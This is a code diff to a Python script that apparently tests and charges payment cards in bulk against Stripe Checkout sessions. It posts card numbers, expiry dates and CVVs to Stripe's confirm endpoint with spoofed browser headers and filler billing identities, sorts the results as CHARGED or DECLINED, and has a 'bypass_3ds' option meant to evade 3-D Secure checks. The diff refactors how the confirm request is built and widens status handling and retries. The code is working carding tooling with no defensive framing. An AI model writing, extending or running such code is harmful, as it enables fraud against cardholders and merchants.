@@ -7,7 +7,7 @@ HEADERS = {
     "content-type": "application/x-www-form-urlencoded",
     "origin": "https://checkout.stripe.com",
     "referer": "https://checkout.stripe.com/",
-    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
 }
 
 _session = None
@@ -32,6 +32,55 @@ async def close_session():
 
 def _card_display(card: dict) -> str:
     return f"{card['cc']}|{card['month']}|{card['year']}|{card['cvv']}"
+
+
+def _build_confirm_body(pm_id: str, pk: str, init_data: dict, bypass_3ds: bool) -> str:
+    checksum = init_data.get("init_checksum", "")
+
+    lig = init_data.get("line_item_group")
+    inv = init_data.get("invoice")
+    if lig:
+        total = lig.get("total", 0)
+        subtotal = lig.get("subtotal", 0)
+        tax_exclusive = lig.get("total_exclusive_tax", 0)
+        tax_inclusive = lig.get("total_inclusive_tax", 0)
+        discount = lig.get("total_discount_amount", 0)
+        shipping = lig.get("shipping_rate_amount", 0)
+    elif inv:
+        total = inv.get("total", 0)
+        subtotal = inv.get("subtotal", 0)
+        tax_exclusive = inv.get("total_exclusive_tax", inv.get("tax", 0))
+        tax_inclusive = inv.get("total_inclusive_tax", 0)
+        discount = inv.get("total_discount_amount", 0)
+        shipping = inv.get("shipping_rate_amount", 0)
+    else:
+        pi = init_data.get("payment_intent") or {}
+        si = init_data.get("setup_intent") or {}
+        total = pi.get("amount", 0) or si.get("amount", 0)
+        subtotal = total
+        tax_exclusive = 0
+        tax_inclusive = 0
+        discount = 0
+        shipping = 0
+
+    conf_body = (
+        f"eid=NA"
+        f"&payment_method={pm_id}"
+        f"&expected_amount={total}"
+        f"&last_displayed_line_item_group_details[subtotal]={subtotal}"
+        f"&last_displayed_line_item_group_details[total_exclusive_tax]={tax_exclusive}"
+        f"&last_displayed_line_item_group_details[total_inclusive_tax]={tax_inclusive}"
+        f"&last_displayed_line_item_group_details[total_discount_amount]={discount}"
+        f"&last_displayed_line_item_group_details[shipping_rate_amount]={shipping}"
+        f"&expected_payment_method_type=card"
+        f"&key={pk}"
+        f"&init_checksum={checksum}"
+    )
+
+    if bypass_3ds:
+        conf_body += "&return_url=https://checkout.stripe.com"
+
+    return conf_body
 
 
 async def charge_card(
@@ -69,24 +118,11 @@ async def charge_card(
             connector = aiohttp.TCPConnector(limit=100, ssl=False)
             async with aiohttp.ClientSession(connector=connector) as s:
                 email = init_data.get("customer_email") or "john@example.com"
-                checksum = init_data.get("init_checksum", "")
-
-                lig = init_data.get("line_item_group")
-                inv = init_data.get("invoice")
-                if lig:
-                    total = lig.get("total", 0)
-                    subtotal = lig.get("subtotal", 0)
-                elif inv:
-                    total = inv.get("total", 0)
-                    subtotal = inv.get("subtotal", 0)
-                else:
-                    pi = init_data.get("payment_intent") or {}
-                    total = subtotal = pi.get("amount", 0)
 
                 cust = init_data.get("customer") or {}
                 addr = cust.get("address") or {}
                 name = cust.get("name") or "John Smith"
-                country = addr.get("country") or "US"
+                country = addr.get("country") or init_data.get("account_settings", {}).get("country") or "US"
                 line1 = addr.get("line1") or "476 West White Mountain Blvd"
                 city = addr.get("city") or "Pinetop"
                 state = addr.get("state") or "AZ"
@@ -118,7 +154,6 @@ async def charge_card(
 
                 if "error" in pm:
                     err_msg = pm["error"].get("message", "Card error")
-                    err_code = pm["error"].get("code", "")
                     result["status"] = "DECLINED"
                     result["response"] = err_msg
                     result["time"] = round(time.perf_counter() - start, 2)
@@ -131,22 +166,7 @@ async def charge_card(
                     result["time"] = round(time.perf_counter() - start, 2)
                     return result
 
-                conf_body = (
-                    f"eid=NA"
-                    f"&payment_method={pm_id}"
-                    f"&expected_amount={total}"
-                    f"&last_displayed_line_item_group_details[subtotal]={subtotal}"
-                    f"&last_displayed_line_item_group_details[total_exclusive_tax]=0"
-                    f"&last_displayed_line_item_group_details[total_inclusive_tax]=0"
-                    f"&last_displayed_line_item_group_details[total_discount_amount]=0"
-                    f"&last_displayed_line_item_group_details[shipping_rate_amount]=0"
-                    f"&expected_payment_method_type=card"
-                    f"&key={pk}"
-                    f"&init_checksum={checksum}"
-                )
-
-                if bypass_3ds:
-                    conf_body += "&return_url=https://checkout.stripe.com"
+                conf_body = _build_confirm_body(pm_id, pk, init_data, bypass_3ds)
 
                 async with s.post(
                     f"https://api.stripe.com/v1/payment_pages/{cs}/confirm",
@@ -164,7 +184,9 @@ async def charge_card(
                     result["response"] = f"{dc.upper()}: {msg}" if dc else msg
                 else:
                     pi = conf.get("payment_intent") or {}
-                    st = pi.get("status", "") or conf.get("status", "")
+                    si = conf.get("setup_intent") or {}
+                    st = pi.get("status", "") or si.get("status", "") or conf.get("status", "")
+
                     if st == "succeeded":
                         result["status"] = "CHARGED"
                         result["response"] = "Payment Successful"
@@ -178,6 +200,12 @@ async def charge_card(
                     elif st == "requires_payment_method":
                         result["status"] = "DECLINED"
                         result["response"] = "Card Declined"
+                    elif st == "requires_confirmation":
+                        result["status"] = "DECLINED"
+                        result["response"] = "Requires Confirmation"
+                    elif st == "processing":
+                        result["status"] = "CHARGED"
+                        result["response"] = "Payment Processing"
                     else:
                         result["status"] = "UNKNOWN"
                         result["response"] = st or "Unknown"
@@ -189,7 +217,7 @@ async def charge_card(
             err_str = str(e)
             retryable = any(
                 kw in err_str.lower()
-                for kw in ("disconnect", "timeout", "connection")
+                for kw in ("disconnect", "timeout", "connection", "reset", "broken")
             )
             if attempt < max_retries and retryable:
                 await asyncio.sleep(1)
